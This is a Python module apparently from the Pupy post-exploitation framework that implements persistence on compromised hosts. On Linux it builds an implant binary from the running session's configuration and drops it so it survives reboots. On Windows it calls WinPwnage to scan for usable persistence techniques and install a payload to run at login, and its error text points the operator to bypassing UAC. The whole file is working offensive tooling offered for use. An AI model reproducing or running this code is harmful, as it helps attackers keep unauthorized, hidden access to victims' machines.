# -*- coding: utf-8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided
# that the following conditions are met:
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and
# the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and
# the following disclaimer in the documentation and/or other materials provided with the distribution.
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or
# promote products derived from this software without specific prior written permission.
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
# INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupylib.PupyCompleter import remote_path_completer
import pupygen

__class_name__ = "Persistence"


@config(cat="manage", compat=['linux', 'windows'])
class Persistence(PupyModule):
    """ Enable / Disable persistence """

    dependencies = {
        'linux': ['persistence'],
        'windows': ['winpwnage.core', 'winpwnage.functions.persist']
    }

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="persistence", description=cls.__doc__)
        cls.arg_parser.add_argument(
            '-s', '--shared', action='store_true', default=False,
            help='prefer shared object (linux only)')
        cls.arg_parser.add_argument(
            '-p', dest='payload',
            help='remote path or cmd to execute at login (windows only)', completer=remote_path_completer)
        cls.arg_parser.add_argument(
            '-n', dest='name',
            help='custom name to use (windows only)')
        cls.arg_parser.add_argument(
            '-m', dest='method',
            help="should be an ID, get the list (-l) scanning which methods are possible (windows only)")
        cls.arg_parser.add_argument(
            '-l', dest='scan', action='store_true', default=False,
            help="list all possible techniques for this host (windows only)")
        cls.arg_parser.add_argument(
            '--remove', action='store_true',
            help='remove persistence', default=False)

    def run(self, args):
        if self.client.is_windows():
            self.windows(args)
        else:
            self.linux(args)

    def linux(self, args):
        if args.remove:
            # TODO persistence removal
            self.error("not implemented for linux")
            return

        drop = self.client.remote('persistence', 'drop', False)
        exebuff, tpl, _ = pupygen.generate_binary_from_template(
            self.log,
            self.client.get_conf(),
            self.client.desc['platform'],
            arch=self.client.arch,
            shared=args.shared
        )

        self.success("Generating the payload with the current config from {} - size={}".format(
            tpl, len(exebuff)))

        drop_path, conf_path, method = drop(exebuff, args.shared)
        if drop_path and conf_path and method:
            self.success('Dropped: {} Method: {} Config: {}'.format(drop_path, method, conf_path))
        elif method:
            self.error('Failed: {}'.format(method))
        else:
            self.error('Couldn\'t make service persistent.')

    def parse_result(self, result, print_result=True, get_method_id=True):
        """
        Parse result returned by WinPwnage
        Return the best method id if possible
        """
        func = {'t': self.log, 'ok': self.success, 'error': self.error, 'info': self.info, 'warning': self.warning}
        preferred_methods = self.client.pupsrv.config.get("persistence", "preferred_methods").split(',')

        method_id = []
        for tag, message in result:
            if tag in func:
                if print_result:
                    func[tag](message)
                if tag == 'ok' and get_method_id:
                    method_id.append(message.split()[0])

        if get_method_id:
            for p in preferred_methods:
                if p in method_id:
                    return p

    def launch_scan(self, print_result=True):
        """
        Check all possible methods found on the target to persist
        """
        scanner = self.client.remote('winpwnage.core.scanner', 'scanner', False)
        result = scanner(uac=False, persist=True).start()
        return self.parse_result(result, print_result)

    def windows(self, args):

        if args.scan:
            self.launch_scan()
            return

        if not args.remove and not args.payload:
            self.error('Add payload (remote path to execute at login)')
            return

        name = args.name if args.name else self.client.pupsrv.config.get("persistence", "name")
        method = args.method
        if not method and (not args.scan or not args.remove):
            method = self.launch_scan(print_result=False)
            if not method:
                self.error('Get the list of possible methods (-l) and bypass uac using -m <id>')
                return

        persist = self.client.remote('winpwnage.core.scanner', 'function', False)
        result = persist(uac=False, persist=True).run(
            id=method, payload=args.payload, name=name, add=not args.remove
        )
        if not result:
            self.error('Nothing done, check if the id is on the list')
        else:
            self.parse_result(result, get_method_id=False)
